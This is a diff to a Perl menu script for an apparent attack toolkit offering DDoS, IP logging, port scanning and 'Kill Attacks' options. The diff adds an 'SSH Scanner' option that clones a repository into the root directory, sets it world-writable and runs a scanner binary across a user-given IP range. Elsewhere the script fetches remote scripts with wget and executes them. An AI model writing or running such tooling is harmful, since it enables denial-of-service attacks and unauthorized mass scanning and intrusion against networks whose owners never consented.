@@ -52,7 +52,7 @@ print "                                                                         
 print "             1. Geo-locate IP     2. DDoS              3. Port Scan            \n";
 print "             4. Dstat             5. Ping              6. Kill Attacks         \n";
 print "             7. Change Pass       8. Web Resolver      9. IP Logger            \n"; 
-print "             10. Update Script    11. Coming soon      12."; print color 'bold bright_red';print " Credits             \n";print color 'bold white';   
+print "             10. Update Script    11. SSH Scanner      12."; print color 'bold bright_red';print " Credits             \n";print color 'bold white';   
 print "                                                                               ";  
 print "===============================================================================\n\n";
 print color 'bold bright_red';
@@ -542,10 +542,27 @@ system("rm -rf update.pl");
 system("rm -rf menu.pl");
 system("wget https://raw.githubusercontent.com/xRtos/geolocation-php-logger/master/updater/update");
 system("wget https://raw.githubusercontent.com/xRtos/geolocation-php-logger/master/updater/update.pl");
+system("rm -rf menu.pl");
 system("perl update.pl");
 system("rm -rf update.pl");
 system("rm -rf update");
 system("perl menu.pl");
+}
+if ($ip == 11) {
+	system("clear");
+print color 'bold white';
+system("rm -rf /unixcod");
+system("cd /;git clone https://github.com/xRtos/unixcod.git;cd /unixcod;chmod 777 *");
+system("clear");
+print "\n\n\n\n\n\n\n";
+print "\n               -----------------------------------------------";
+print "\n               | ";print color 'bold red';print "If you do not know how to use this scanner,";print color 'bold white';print " |";
+print "\n               |  ";print color 'bold red';print " then fuck off and dont even bother with";print color 'bold white';print "   |";
+print "\n               |";print color 'bold red';print "               figuring it out.";print color 'bold white';print "              |";
+print "\n               -----------------------------------------------\n";
+print "\n                        Enter A Scanning Range[45.63]: "; $option = <>;
+system("cd /unixcod;./unix $option");
+system("cd /root;perl menu.pl");
 } else {
 	print color 'bold red';
 						   print "                              ";
